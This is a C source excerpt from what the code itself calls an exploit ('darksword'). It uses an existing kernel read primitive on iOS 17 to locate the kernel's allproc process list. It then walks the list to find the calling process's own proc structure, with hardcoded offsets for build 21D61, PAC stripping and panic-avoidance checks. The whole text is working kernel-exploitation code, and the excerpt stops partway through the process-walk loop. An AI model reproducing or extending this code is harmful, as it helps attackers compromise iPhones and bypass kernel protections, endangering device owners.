                bool strict_heap = is_heap_ptr(stripped);
                /* Bug #445: allproc head from XPF offset may be in zone_map but below
                 * zone_safe_min (GEN1 region near rw_socket_pcb). Accept zone_map addrs. */
                bool relaxed_heap = is_heap_ptr_relaxed(stripped) || is_in_zone_map(stripped);
                if (!relaxed_heap) {
                /* Bug #256B: If head value is a kernel DATA pointer (same segment
                 * as kbase), this might be allproc whose lh_first = proc0 (static
                 * kernel_task stored in __DATA, NOT heap-allocated).
                 *
                 * Offline test v21 confirmed:
                 *   - 0x321C240 is the REAL allproc (LIST_TRAVERSAL + HEAD_MUTATION)
                 *   - At init: STP X9,X9,[X9,#0] (self-pointer sentinel)
                 *   - At runtime: lh_first = kbase+0x321C500 (DATA-resident proc0)
                 *
                 * proc0 (kernel_task) lives in __DATA, PID=0. Its le_next at +0x00
                 * points to the second proc (in heap), from where we can walk the
                 * entire allproc list forward to find our PID. */
                if (is_kptr(stripped) && stripped >= kbase && stripped < kbase + 0x4000000ULL) {
                    filelog_write("[allproc] direct 0x%llx: val is kernel DATA ptr 0x%llx "
                                  "(data_off=0x%llx), checking as DATA-resident proc0...",
                                  candidate, stripped, stripped - kbase);
                    /* Read PID at stripped+0x60 — if 0, this is proc0 (kernel_task) */
                    uint32_t d_pid = 0xFFFFFFFF;
                    bool d_ok = ds_kread32_checked(stripped + 0x60, &d_pid);
                    filelog_write("[allproc] DATA-proc0 PID read: kread=%d pid=%u at 0x%llx",
                                  (int)d_ok, d_pid, stripped + 0x60);
                    if (d_ok && d_pid == 0) {
                        /* This IS proc0. Read le_next to get first heap proc. */
                        uint64_t le_next_raw = 0;
                        if (ds_kread64_checked(stripped + 0x00, &le_next_raw)) {
                            uint64_t le_next = pac_strip(le_next_raw);
                            filelog_write("[allproc] DATA-proc0 le_next=0x%llx heap=%d relaxed=%d",
                                          le_next, (int)is_heap_ptr(le_next),
                                          (int)is_heap_ptr_relaxed(le_next));
                            if (is_heap_ptr_relaxed(le_next)) {
                                uint32_t le_next_pid = 0;
                                bool le_next_ok = ds_kread32_checked(le_next + 0x60, &le_next_pid);
                                /* Bug #340: iOS 17 uses PROC_PID_OFFSET=0xd8, not 0x60.
                                 * If 0x60 gives invalid result, also try PROC_PID_OFFSET.
                                 * Bug #342: Before reading at PROC_PID_OFFSET (e.g. 0xd8),
                                 * validate le_prev back-reference to prevent zone_require panic.
                                 * In BSD LIST: first_heap_proc.p_list.le_prev == &proc0.p_list.le_next
                                 * = proc0_kdata_base (== stripped, since p_list is at offset 0).
                                 * A false-positive "proc0" would have le_next pointing to a
                                 * non-proc heap object whose zone element may be only ~0xd8 bytes,
                                 * causing zone_require panic when reading le_next+0xd8. */
                                if (!(le_next_ok && le_next_pid > 0 && is_plausible_pid(le_next_pid)) &&
                                    PROC_PID_OFFSET != 0x60) {
                                    uint64_t lp_raw2 = 0;
                                    bool lp2_ok = ds_kread64_checked(le_next + 0x08, &lp_raw2);
                                    uint64_t lp2_val = lp2_ok ? pac_strip(lp_raw2) : 0;
                                    filelog_write("[allproc] Bug #342: le_prev check *(le_next+8)=0x%llx proc0=0x%llx match=%d",
                                                  lp2_val, stripped, (int)(lp2_val == stripped));
                                    if (lp2_ok && lp2_val == stripped) {
                                        le_next_ok = ds_kread32_checked(le_next + PROC_PID_OFFSET, &le_next_pid);
                                    } else {
                                        filelog_write("[allproc] Bug #342: le_prev mismatch — skip +0x%x read (prevent zone panic)",
                                                      PROC_PID_OFFSET);
                                    }
                                }
                                filelog_write("[allproc] DATA-proc0 le_next PID: kread=%d pid=%u plausible_nonzero=%d",
                                              (int)le_next_ok, le_next_pid,
                                              (int)(le_next_ok && le_next_pid > 0 && is_plausible_pid(le_next_pid)));
                                if (!(le_next_ok && le_next_pid > 0 && is_plausible_pid(le_next_pid))) {
                                    filelog_write("[allproc] Bug #270: DATA-proc0 le_next PID invalid/zero — rejecting candidate");
                                    continue;
                                }
                                /* Transition: allproc → proc0(DATA) → heap proc chain.
                                 * Accept this candidate and set up direct layout.
                                 * ourproc() will start from proc0 and walk le_next into heap. */
                                PROC_LIST_OFFSET = 0x00;   /* BSD LIST_ENTRY at proc+0 */
                                PROC_NEXT_OFFSET = 0x00;   /* le_next at proc+0 */
                                PROC_PREV_OFFSET = 0x08;   /* le_prev at proc+8 */
                                g_direct_layout_set = true;
                                g_kernproc_addr = candidate;
                                g_kernproc_is_pid0 = false; /* NOT kernproc-mode: walk forward, not backward */
                                filelog_write("[allproc] DATA-proc0 allproc SUCCESS at 0x%llx "
                                              "(offset 0x%llx): proc0=0x%llx, first_heap=0x%llx",
                                              candidate, direct_offs[i], stripped, le_next);
                                return candidate;
                            }
                        }
                        /* Bug #333: iOS 17.3.1 SMRQ allproc layout.
                         * *(allproc) stores proc0_base directly (list_off=0).
                         * proc0 IS the SMRQ entry: sle_seq at +0x00 = 0 (zero-init static),
                         * sle_next at +0x08 = first_heap_proc_base (next user proc).
                         * p_pid at +0x60 = 0 already confirmed above.
                         * The old le_next read at +0x00 returned sle_seq=0 and failed
                         * is_heap_ptr_relaxed(), never reaching sle_next at +0x08.
                         * Fix: also probe +0x08 to find the first heap user process. */
                        {
                            uint64_t sle_next_raw = 0;
                            if (ds_kread64_checked(stripped + 0x08, &sle_next_raw)) {
                                uint64_t sle_next = pac_strip(sle_next_raw);
                                filelog_write("[allproc] Bug #333: *(proc0+0x08)=0x%llx heap=%d relaxed=%d",
                                              sle_next, (int)is_heap_ptr(sle_next),
                                              (int)is_heap_ptr_relaxed(sle_next));
                                if (is_heap_ptr_relaxed(sle_next)) {
                                    uint32_t sn_pid = 0;
                                    bool sn_ok = ds_kread32_checked(sle_next + 0x60, &sn_pid);
                                    /* Bug #340: also try PROC_PID_OFFSET for iOS 17 (0xd8).
                                     * Bug #342: Only retry if sle_next+0x60 read SUCCEEDED;
                                     * if it failed, sle_next may be freed/invalid — don't
                                     * read at deeper offset to avoid zone_require panic. */
                                    if (sn_ok && !(sn_pid > 0 && is_plausible_pid(sn_pid)) && PROC_PID_OFFSET != 0x60) {
                                        sn_ok = ds_kread32_checked(sle_next + PROC_PID_OFFSET, &sn_pid);
                                    }
                                    filelog_write("[allproc] Bug #333: sle_next PID: kread=%d pid=%u plausible_nonzero=%d",
                                                  (int)sn_ok, sn_pid,
                                                  (int)(sn_ok && sn_pid > 0 && is_plausible_pid(sn_pid)));
                                    if (sn_ok && sn_pid > 0 && is_plausible_pid(sn_pid)) {
                                        /* Accept: allproc → proc0(DATA) with SMRQ sle_next at +0x08.
                                         * list_off=0 means proc_base IS the SMRQ entry (p_list at proc+0x00).
                                         * Walk: kread64(proc+0x00+0x08) = kread64(proc+0x08) = next_proc_base. */
                                        PROC_LIST_OFFSET = 0x00;
                                        PROC_NEXT_OFFSET = 0x08;  /* sle_next within the entry */
                                        PROC_PREV_OFFSET = 0x00;  /* SMRQ singly-linked: no le_prev */
                                        /* Bug #340: preserve PROC_PID_OFFSET (may be 0xd8 for iOS 17) */
                                        /* PROC_PID_OFFSET stays as-is (0xd8 or 0x60 from init) */
                                        g_direct_layout_set = true;
                                        g_kernproc_addr = candidate;
                                        g_kernproc_is_pid0 = false;
                                        filelog_write("[allproc] Bug #333: DATA-SMRQ SUCCESS "
                                                      "proc0=0x%llx sle_next=0x%llx pid=%u "
                                                      "(list_off=0 next_off=0x08 pid_off=0x%x)",
                                                      stripped, sle_next, sn_pid, PROC_PID_OFFSET);
                                        return candidate;
                                    }
                                }
                            }
                        }
                    }
                    /* Bug #257: Also check with -0xb0 offset (SMRQ interpretation).
                     * On iOS 17, allproc is SMRQ-linked: allproc stores &proc0->p_smrq_list
                     * = proc0 + 0xb0, NOT proc0 base.  The SMRQ next pointer is at the
                     * entry itself (proc+0xb0), pointing to next_proc+0xb0.
                     * We read SMRQ next from `stripped` (= proc+0xb0), NOT from proc+0x00
                     * (which is the BSD le_next — a different list that may be stale). */
                    if (stripped >= 0xb0) {
                        uint64_t d_base2 = stripped - 0xb0;
                        if (is_kptr(d_base2) && d_base2 >= kbase) {
                            uint32_t d_pid2 = 0xFFFFFFFF;
                            bool d_ok2 = ds_kread32_checked(d_base2 + 0x60, &d_pid2);
                            filelog_write("[allproc] DATA-proc0 SMRQ interp: base=0x%llx kread=%d pid=%u",
                                          d_base2, (int)d_ok2, d_pid2);
                            if (d_ok2 && d_pid2 == 0) {
                                /* Bug #257: Read SMRQ next from `stripped` (= proc0+0xb0),
                                 * NOT from d_base2 (= proc0+0x00, BSD le_next).
                                 * *(proc0+0xb0) = smrq_next = next_proc+0xb0.
                                 * next_proc base = smrq_next - 0xb0. */
                                uint64_t smrq_next_raw = 0;
                                if (ds_kread64_checked(stripped, &smrq_next_raw)) {
                                    uint64_t smrq_next = pac_strip(smrq_next_raw);
                                    filelog_write("[allproc] DATA-proc0 SMRQ next: raw=0x%llx stripped=0x%llx candidate=0x%llx sentinel=%d",
                                                  smrq_next_raw, smrq_next, candidate,
                                                  (int)(smrq_next == candidate));
                                    bool smrq_ok = false;
                                    if (smrq_next && is_kptr(smrq_next) && smrq_next != candidate && smrq_next >= 0xb0) {
                                        uint64_t next_proc = smrq_next - 0xb0;
                                        bool np_heap = is_heap_ptr_relaxed(next_proc);
                                        bool np_data = is_kernel_data_ptr(next_proc);
                                        filelog_write("[allproc] DATA-proc0 SMRQ next_proc=0x%llx heap=%d data=%d",
                                                      next_proc, (int)np_heap, (int)np_data);
                                        if (np_heap || np_data) {
                                            /* Bug #261B: proc0 PID=0 already confirmed.
                                             * Read PID from next proc for validation. */
                                            uint32_t np_pid = 0;
                                            uint32_t np_pid_off = 0x60;
                                            bool np_ok = ds_kread32_checked(next_proc + 0x60, &np_pid);
                                            if (PROC_PID_OFFSET != 0x60 && (!np_ok || !(np_pid > 0 && is_plausible_pid(np_pid)))) {
                                                uint32_t np_pid2 = 0;
                                                bool np_ok2 = ds_kread32_checked(next_proc + PROC_PID_OFFSET, &np_pid2);
                                                filelog_write("[allproc] Bug #431: SMRQ alt pid probe off=0x%x kread=%d pid=%u",
                                                              PROC_PID_OFFSET, (int)np_ok2, np_pid2);
                                                if (np_ok2) {
                                                    np_pid = np_pid2;
                                                    np_pid_off = PROC_PID_OFFSET;
                                                    np_ok = true;
                                                }
                                            }
                                            filelog_write("[allproc] DATA-proc0 SMRQ next_proc PID: kread=%d pid=%u plausible=%d",
                                                          (int)np_ok, np_pid, (int)(np_ok && is_plausible_pid(np_pid)));
                                            /* Bug #263A: REQUIRE plausible PID on second entry.
                                             * If proc1 also has PID=0, this is NOT allproc
                                             * (it's a different kernel structure like zone array).
                                             * 0x321C240 showed 762 DATA entries all PID=0. */
                                            if (np_ok && np_pid > 0 && is_plausible_pid(np_pid)) {
                                                filelog_write("[allproc] Bug #431: SMRQ next_proc accepted via pid_off=0x%x",
                                                              np_pid_off);
                                                smrq_ok = true;
                                            } else {
                                                filelog_write("[allproc] Bug #263A: next_proc PID=%u NOT plausible — "
                                                              "this is NOT allproc, skipping candidate", np_pid);
                                                smrq_ok = false;
                                            }
                                        } else {
                                            filelog_write("[allproc] DATA-proc0 SMRQ next_proc rejected: not heap/data");
                                        }
                                    } else {
                                        filelog_write("[allproc] DATA-proc0 SMRQ next below 0xb0: 0x%llx", smrq_next);
                                    }
                                    if (smrq_ok) {
                                        /* allproc is SMRQ-linked: entry at proc+0xb0,
                                         * next pointer at the entry itself (offset 0 within entry).
                                         * PROC_LIST_OFFSET = 0xb0 so ourproc() subtracts 0xb0
                                         * from the SMRQ entry address to get proc base. */
                                        PROC_LIST_OFFSET = 0xb0;  /* SMRQ entry at proc+0xb0 */
                                        PROC_NEXT_OFFSET = 0x00;  /* next is at entry+0 */
                                        PROC_PREV_OFFSET = 0x08;  /* unused for SMRQ singly-linked */
                                        g_direct_layout_set = true;
                                        g_kernproc_addr = candidate;
                                        g_kernproc_is_pid0 = false;
                                        filelog_write("[allproc] DATA-proc0 SMRQ allproc SUCCESS at 0x%llx "
                                                      "(LIST_OFF=0xb0, proc0=0x%llx, smrq_next=0x%llx)",
                                                      candidate, d_base2, smrq_next);
                                        return candidate;
                                    }
                                    /* Bug #257: TAILQ fallback — if kernel_task is the LAST entry
                                     * (smrq_next=0 or not valid), allproc might be a TAILQ where:
                                     *   tqh_first at (candidate - 8) → newest_proc + 0xb0
                                     *   tqh_last  at (candidate)     → &last_proc->smrq_next = proc0+0xb0
                                     * Read tqh_first and check if it points to a valid heap proc. */
                                    filelog_write("[allproc] DATA-proc0 SMRQ next invalid (0x%llx), "
                                                  "trying TAILQ: tqh_first at 0x%llx",
                                                  smrq_next, candidate - 8);
                                    uint64_t tqh_first_raw = 0;
                                    if (ds_kread64_checked(candidate - 8, &tqh_first_raw)) {
                                        uint64_t tqh_first = pac_strip(tqh_first_raw);
                                        filelog_write("[allproc] TAILQ tqh_first=0x%llx", tqh_first);
                                        if (tqh_first >= 0xb0) {
                                            uint64_t tq_proc = tqh_first - 0xb0;
                                            filelog_write("[allproc] TAILQ first_proc=0x%llx heap=%d relaxed=%d",
                                                          tq_proc, (int)is_heap_ptr(tq_proc),
                                                          (int)is_heap_ptr_relaxed(tq_proc));
                                            if (is_heap_ptr_relaxed(tq_proc)) {
                                                uint32_t tq_pid = 0;
                                                uint32_t tq_pid_off = 0x60;
                                                bool tq_ok = ds_kread32_checked(tq_proc + 0x60, &tq_pid);
                                                if (PROC_PID_OFFSET != 0x60 && (!tq_ok || !(tq_pid > 0 && is_plausible_pid(tq_pid)))) {
                                                    uint32_t tq_pid2 = 0;
                                                    bool tq_ok2 = ds_kread32_checked(tq_proc + PROC_PID_OFFSET, &tq_pid2);
                                                    filelog_write("[allproc] Bug #431: TAILQ alt pid probe off=0x%x kread=%d pid=%u",
                                                                  PROC_PID_OFFSET, (int)tq_ok2, tq_pid2);
                                                    if (tq_ok2) {
                                                        tq_pid = tq_pid2;
                                                        tq_pid_off = PROC_PID_OFFSET;
                                                        tq_ok = true;
                                                    }
                                                }
                                                filelog_write("[allproc] TAILQ first_proc PID: kread=%d pid=%u",
                                                              (int)tq_ok, tq_pid);
                                                if (tq_ok && is_plausible_pid(tq_pid)) {
                                                    PROC_LIST_OFFSET = 0xb0;
                                                    PROC_NEXT_OFFSET = 0x00;
                                                    PROC_PREV_OFFSET = 0x08;
                                                    g_direct_layout_set = true;
                                                    g_kernproc_addr = candidate - 8; /* tqh_first */
                                                    g_kernproc_is_pid0 = false;
                                                    filelog_write("[allproc] Bug #431: TAILQ accepted via pid_off=0x%x",
                                                                  tq_pid_off);
                                                    filelog_write("[allproc] TAILQ allproc SUCCESS: "
                                                                  "head=0x%llx first_proc=0x%llx pid=%u",
                                                                  candidate - 8, tq_proc, tq_pid);
                                                    return candidate - 8;
                                                }
                                            }
                                        }
                                    }
                                } else {
                                    filelog_write("[allproc] DATA-proc0 SMRQ next kread FAILED at entry=0x%llx", stripped);
                                }
                            }
                        }
                    }
                }
                    filelog_write("[allproc] direct 0x%llx: val=0x%llx not even relaxed-heap", candidate, head_val);
                    continue;
                }
                /* Bug #239b: Try v2 validation FIRST (backlink + hardcoded offsets).
                 * This bypasses disc_pl which cannot discover list_off=0 from *(allproc)=proc_base. */
                if (validate_direct_allproc_v2(candidate)) {
                    filelog_write("[allproc] direct_v2 candidate SUCCESS at 0x%llx (offset 0x%llx)",
                                  candidate, cur_offs[i]);
                    /* g_kernproc_addr already set by validate_direct_allproc_v2 */
                    return candidate;
                }
                /* Bug #255: If v2 rejected this candidate (chain too short / wrong PIDs),
                 * check if it's actually the kernproc variable (→ kernel_task, PID 0).
                 * kernel_task is at the TAIL of allproc, so forward-chain is always 1.
                 * Accept it and let ourproc() backward-walk via BSD le_prev. */
                if (detect_kernproc_variable(candidate)) {
                    filelog_write("[allproc] KERNPROC candidate SUCCESS at 0x%llx (offset 0x%llx)",
                                  candidate, cur_offs[i]);
                    return candidate;
                }
                if (!strict_heap) {
                    filelog_write("[allproc] direct 0x%llx: val=0x%llx relaxed-heap only, skip legacy validator",
                                  candidate, head_val);
                    continue;
                }
                /* Fallback to legacy disc_pl validation */
                if (validate_allproc(candidate)) {
                    filelog_write("[allproc] direct candidate SUCCESS (legacy) at 0x%llx (offset 0x%llx)",
                                  candidate, cur_offs[i]);
                    g_kernproc_addr = candidate;
                    return candidate;
                }
                filelog_write("[allproc] direct 0x%llx: both v2 and legacy validation failed", candidate);
            }
        }
        if (ds_proc_scope_guard_tripped()) {
            filelog_write("[allproc] Bug #437: direct shortlist ended with PANIC GUARD latched; "
                          "resetting before XPF-lite and scan fallbacks");
            ds_reset_proc_scope_guard();
        }
        /* Bug #447: direct-shortlist validation can blacklist a promising head
         * (e.g. 0x3213678 -> heap proc0-like head) before the XPF-lite path gets
         * its own pass. Clear only the failed-head cache here so env-provided
         * exact candidates are re-evaluated independently from the shortlist. */
        if (g_failed_allproc_head_count > 0) {
            g_failed_allproc_head_count = 0;
            filelog_write("[allproc] Bug #447: cleared failed-head blacklist before XPF-lite fallback");
        }
        filelog_write("[allproc] direct candidates exhausted, trying XPF-lite env fallback");

        uint64_t xpf_lite = try_xpf_lite_offsets(kbase);
        if (xpf_lite) {
            filelog_write("[allproc] Bug #297: using XPF-lite resolved allproc at 0x%llx (offset 0x%llx)",
                          xpf_lite, xpf_lite - kbase);
            return xpf_lite;
        }

        filelog_write("[allproc] XPF-lite fallback exhausted, falling back to scan");
    }

    /* Bug #335: inner __DATA.__bss scan is safe via canary-checked 8-byte reads
     * (Bug #271 replaced the panic-prone 16KB bulk reads).  Session 25 confirmed
     * allproc at kbase+0x321C408 in this range; enable unconditionally so every
     * run finds allproc even when curated shortlist candidates all fail.
     * DS_ENABLE_ALLPROC_SCAN=0 can still opt-out for debugging purposes. */
    const char *allproc_scan_env = getenv("DS_ENABLE_ALLPROC_SCAN");
    uint64_t scanned = 0;
    bool enable_allproc_scan = true;
    if (allproc_scan_env && allproc_scan_env[0]) {
        enable_allproc_scan = (allproc_scan_env[0] != '0');
    } else if (ds_build_is_21D61()) {
        const char *auto_scan_env = getenv("DS_ENABLE_ALLPROC_SCAN_AUTO");
        if (auto_scan_env && auto_scan_env[0] != '0') {
            enable_allproc_scan = true;
            filelog_write("[allproc] Bug #448: inner DATA scan auto-last-resort re-enabled via DS_ENABLE_ALLPROC_SCAN_AUTO=1");
        } else {
            enable_allproc_scan = false;
            filelog_write("[allproc] Bug #448: keeping inner DATA scan OFF by default on 21D61 after zone-bound panic during scan fallback "
                          "(set DS_ENABLE_ALLPROC_SCAN_AUTO=1 to force old behavior)");
        }
    }

    if (enable_allproc_scan) {
        filelog_write("[allproc] starting inner-kernel DATA range scan (Bug #335: enabled by default)...");
        scanned = scan_allproc_known_range(kbase);
        if (scanned) {
            filelog_write("[allproc] DATA scan found allproc at 0x%llx (offset 0x%llx)",
                          scanned, scanned - kbase);
            return scanned;
        }
        filelog_write("[allproc] DATA range scan: not found");
    } else {
        filelog_write("[allproc] inner DATA scan disabled");
    }

    /* Bug #420: with guarded kread target gates (Bug #418/#419) and panic-guarded
     * abort path, keep Mach-O parse scan ON by default as the final allproc resolver.
     * Allow explicit opt-out via DS_ENABLE_MACHO_SCAN=0 for debugging. */
    const char *enable_macho_scan = getenv("DS_ENABLE_MACHO_SCAN");
    if (!enable_macho_scan || enable_macho_scan[0] != '0') {
        filelog_write("[allproc] falling back to Mach-O parse scan (Bug #420: enabled by default)...");
        scanned = scan_for_allproc();
        if (scanned) {
            filelog_write("[allproc] Mach-O scan found allproc at 0x%llx (offset 0x%llx)",
                          scanned, scanned - kbase);
            return scanned;
        }
        filelog_write("[allproc] Mach-O parse scan: not found");
    } else {
        filelog_write("[allproc] Mach-O parse scan disabled via DS_ENABLE_MACHO_SCAN=0");
    }

    filelog_write("[allproc] ERROR: all strategies exhausted, allproc not found");
    return 0;
}

/* ================================================================
   ourproc: find our proc in the kernel proc list
   ================================================================ */

uint64_t ourproc(void) {
    extern void filelog_write(const char *fmt, ...) __attribute__((format(printf,1,2)));

    ds_begin_proc_read_scope();

    /* Bug #316: ourproc() is part of the bootstrap path that runs BEFORE
     * darksword_core sets g_ds_ready=true. Requiring ds_is_ready() here makes
     * the exploit self-block: core calls ourproc(), ourproc() bails, and the
     * session never reaches the point where g_ds_ready flips to true. Allow the
     * helper to run once early KRW has already established a kernel base. */
    if (!ds_is_ready() && ds_get_kernel_base() == 0) {
        printf("darksword not ready (no early KRW)\n");
        return ds_finish_ourproc_scope(0);
    }

    filelog_write("[ourproc] enter: verifying kread primitive health...");

    /* Bug #216: health check — read kernel Mach-O magic to verify
     * the kread primitive still works before attempting allproc scan.
     * If this fails, the exploit state is broken and we bail early
     * instead of causing a kernel panic during allproc scan. */
    uint64_t kbase = ds_get_kernel_base();
    if (kbase) {
        uint64_t magic = 0;
        if (ds_kread64_checked(kbase, &magic)) {
            if ((magic & 0xFFFFFFFF) == 0xFEEDFACF) {
                filelog_write("[ourproc] kread health check PASSED (magic=0x%llx at kbase=0x%llx)", magic, kbase);
            } else {
                filelog_write("[ourproc] WARNING: unexpected magic 0x%llx at kbase — kread may be corrupt", magic);
            }
        } else {
            filelog_write("[ourproc] FATAL: kread health check FAILED — cannot read kbase 0x%llx", kbase);
            return ds_finish_ourproc_scope(0);
        }
    }

    if (!g_offsets_ready) init_offsets();
    filelog_write("[ourproc] offsets ready: PID=0x%x", PROC_PID_OFFSET);

    bool enable_socket_tro_fastpath = true;
    const char *socket_tro_fastpath_env = getenv("DS_ENABLE_SOCKET_TRO_FASTPATH");
    if (socket_tro_fastpath_env) {
        enable_socket_tro_fastpath = (socket_tro_fastpath_env[0] == '1');
    }
    /* Bug #444: tro_proc/tro_task offsets now scanned for both OS ranges;
     * socket/tro fast path re-enabled for 21D61 */
    (void)0;

    if (enable_socket_tro_fastpath) {
        uint64_t selfproc_fast = find_self_proc_via_socket_tro();
        if (selfproc_fast) {
            filelog_write("[ourproc] returning socket/tro self proc 0x%llx", selfproc_fast);
            return ds_finish_ourproc_scope(selfproc_fast);
        }
    } else {
        filelog_write("[ourproc] Bug #433: socket/tro fast path disabled for stable allproc path (build 21D61)");
    }

    if (ds_proc_scope_guard_tripped()) {
        filelog_write("[ourproc] Bug #432: proc-scope guard tripped during socket/tro fast path; resetting before allproc discovery");
        ds_reset_proc_scope_guard();
    }

    filelog_write("[ourproc] calling kernprocaddress()...");
    uint64_t kernprocaddr = kernprocaddress();
    filelog_write("[ourproc] kernprocaddress() returned 0x%llx", kernprocaddr);
    if (!kernprocaddr) {
        filelog_write("[ourproc] ERROR: kernprocaddress() returned 0");
        return ds_finish_ourproc_scope(0);
    }

    uint64_t kernproc_raw = ds_kread64(kernprocaddr);
    uint64_t kernproc = 0;
    bool have_layout = false;
    if (g_direct_layout_set) {
        /* Bug #239b + #240: validate_direct_allproc_v2 already confirmed offsets.
         * For SMRQ lists (list_off > 0): *(allproc) = list_entry_ptr,
         * so proc_base = stripped - list_off.
         * For BSD lists (list_off == 0): *(allproc) = proc_base directly.
         * Skip disc_pl which has structural issues with certain list_off values. */
        uint64_t stripped = pac_strip(kernproc_raw);
        if (PROC_LIST_OFFSET > 0 && stripped >= PROC_LIST_OFFSET) {
            kernproc = stripped - PROC_LIST_OFFSET;
        } else {
            kernproc = stripped;
        }
        have_layout = true;
        filelog_write("[ourproc] using direct_v2 layout (skip disc_pl): list=0x%x next=0x%x prev=0x%x pid=0x%x kernproc=0x%llx",
                      PROC_LIST_OFFSET, PROC_NEXT_OFFSET, PROC_PREV_OFFSET, PROC_PID_OFFSET, kernproc);
    } else {
        have_layout = discover_proc_list_layout(kernproc_raw, &kernproc);
        if (!have_layout) {
            kernproc = pac_strip(kernproc_raw);
        }
    }
    filelog_write("[ourproc] allproc=0x%llx → raw=0x%llx base=0x%llx list_off=0x%x next_off=0x%x prev_off=0x%x",
                  kernprocaddr, kernproc_raw, kernproc, PROC_LIST_OFFSET, PROC_NEXT_OFFSET, PROC_PREV_OFFSET);

    /* Bug #261C: Dump proc0 entry fields for structure confirmation */
    if (kernproc && is_kernel_data_ptr(kernproc) && PROC_LIST_OFFSET == 0xb0) {
        uint64_t entry_addr = kernproc + PROC_LIST_OFFSET;
        uint64_t le_next_val = 0, le_prev_val = 0;
        ds_kread64_checked(entry_addr + 0x00, &le_next_val);
        ds_kread64_checked(entry_addr + 0x08, &le_prev_val);
        filelog_write("[ourproc] proc0 entry at 0x%llx: le_next=0x%llx le_prev=0x%llx allproc=0x%llx prev_matches=%d",
                      entry_addr, le_next_val, pac_strip(le_prev_val), kernprocaddr,
                      (int)(pac_strip(le_prev_val) == kernprocaddr));
        usleep(50000); /* flush before walk */
    }

    /* Bug #255/256: use relaxed heap check for kernproc (PID 0) since kernel_task
     * might fall between zone_map_min and safe_min.  Strict check is fine for
     * normal allproc since the newest procs are well above safe_min.
     * Bug #256B: proc0 in DATA-resident allproc is at kbase+offset (>= 0xfffffff0),
     * which fails heap checks entirely. Accept kernel DATA pointers if layout was
     * already confirmed by kernprocaddress(). */
    bool heap_ok = g_kernproc_is_pid0 ? is_heap_ptr_relaxed(kernproc) : is_heap_ptr(kernproc);
    if (!heap_ok && g_direct_layout_set && is_kernel_data_ptr(kernproc)) {
        /* Bug #256B: proc0 is in kernel DATA — allow it */
        filelog_write("[ourproc] proc0 in kernel DATA (0x%llx), allowing due to direct_layout",
                      kernproc);
        heap_ok = true;
    }
    if (!heap_ok) {
        filelog_write("[ourproc] kernel proc pointer invalid (outside zone_map): 0x%llx kptr=%d heap=%d relaxed=%d",
                      kernproc, (int)is_kptr(kernproc), (int)is_heap_ptr(kernproc),
                      (int)is_heap_ptr_relaxed(kernproc));
        return ds_finish_ourproc_scope(0);
    }

    /* Bug #238: le_prev mismatch check to find true allproc head.
     * Bug #262A: SKIP this for DATA-resident proc0. Reading le_prev from SMRQ
     * in DATA may point to PPLDATA-protected addresses → kernel panic.
     * DATA-proc0 discovered via SMRQ has a confirmed allproc address already. */
    if (have_layout && kernproc && !is_kernel_data_ptr(kernproc) && is_heap_ptr(kernproc)) {
        uint64_t first_leprev = 0;
        if (kread64_checked_local(kernproc + PROC_LIST_OFFSET + PROC_PREV_OFFSET, &first_leprev)) {
            filelog_write("[ourproc] first entry le_prev=0x%llx allproc=0x%llx",
                          first_leprev, kernprocaddr);
            uint64_t first_leprev_stripped = pac_strip(first_leprev);
        /* Bug #259C: compare PAC-stripped values. Raw le_prev may carry PAC bits
         * that differ from the clean kernprocaddr = kbase + offset. */
        if (first_leprev_stripped && is_kptr(first_leprev_stripped) && first_leprev_stripped != kernprocaddr) {
                filelog_write("[ourproc] le_prev mismatch: trying 0x%llx as real allproc head...",
                              first_leprev_stripped);
                uint64_t real_head_raw = 0;
                if (ds_kread64_checked(first_leprev_stripped, &real_head_raw)) {
                    uint64_t real_head = pac_strip(real_head_raw);
                    filelog_write("[ourproc] *(le_prev)=0x%llx stripped=0x%llx heap=%d",
                                  real_head_raw, real_head, (int)is_heap_ptr_relaxed(real_head));
                    if (real_head && is_heap_ptr_relaxed(real_head)) {
                        uint64_t alt_base = real_head;
                        uint32_t alt_pid = 0;
                        bool alt_ok = read_proc_pid_checked(alt_base, PROC_PID_OFFSET, &alt_pid)
                                      && is_plausible_pid(alt_pid);
                        if (!alt_ok && PROC_LIST_OFFSET && real_head >= PROC_LIST_OFFSET) {
                            alt_base = real_head - PROC_LIST_OFFSET;
                            alt_ok = read_proc_pid_checked(alt_base, PROC_PID_OFFSET, &alt_pid)
                                     && is_plausible_pid(alt_pid);
                        }
                        if (alt_ok && is_heap_ptr(alt_base)) {
                            filelog_write("[ourproc] TAILQ/adjacent fix: switching head 0x%llx(pid=%u) -> 0x%llx(pid=%u)",
                                          kernproc, 0, alt_base, alt_pid);
                            kernproc = alt_base;
                            kernprocaddr = first_leprev;
                        }
                    }
                }
            }
        }
    } else if (is_kernel_data_ptr(kernproc)) {
        filelog_write("[ourproc] Bug #262A: skipping le_prev check for DATA-proc0 (safe)");
    }

    pid_t ourpid = getpid();
    filelog_write("[ourproc] looking for pid=%d, PID_OFFSET=0x%x, LIST_OFFSET=0x%x, NEXT_OFFSET=0x%x",
                  ourpid, PROC_PID_OFFSET, PROC_LIST_OFFSET, PROC_NEXT_OFFSET);

    uint64_t currentproc = kernproc;
    int count = 0;
    int logged = 0; /* log first 30 procs for diagnostics */
    uint32_t max_pid_seen = 0;
    int zombies_skipped = 0; /* Bug #375: consecutive zombie-proc skips */
    /* Bug #233: cycle detection — circular sublists would loop forever */
    uint64_t cycle_visited[256];
    int cycle_nvisited = 0;
    /* Bug #267B: collect forward-walked proc addresses for brute-force PID search */
    uint64_t fwd_procs[64];
    int fwd_count = 0;
    uint64_t proc_candidates[192];
    int proc_candidate_count = 0;

    while (currentproc != 0 && count < 4000) {
        if (ds_proc_scope_guard_tripped()) {
            filelog_write("[ourproc] PANIC GUARD latched during walk at step %d, aborting", count);
            return ds_finish_ourproc_scope(0);
        }
        /* Bug #256B: proc0 may be in kernel DATA (not heap). Accept kptr for
         * the first entry (count==0) when direct_layout_set.  Further entries
         * must be in heap (relaxed or strict depending on mode).
         * Bug #258C: use relaxed heap check when layout confirmed. */
        bool ptr_ok;
        if (g_direct_layout_set && is_kernel_data_ptr(currentproc) && !is_heap_ptr_relaxed(currentproc)) {
            ptr_ok = true;
        } else if (g_kernproc_is_pid0) {
            ptr_ok = is_heap_ptr_relaxed(currentproc);
        } else if (g_direct_layout_set) {
            ptr_ok = is_heap_ptr_relaxed(currentproc) || is_kernel_data_ptr(currentproc);  /* confirmed layout */
        } else {
            ptr_ok = is_heap_ptr(currentproc);
        }
        if (!ptr_ok) {
            filelog_write("[ourproc] proc pointer outside zone_map at step %d: 0x%llx", count, currentproc);
            break;
        }
        /* Bug #233: Cycle detection */
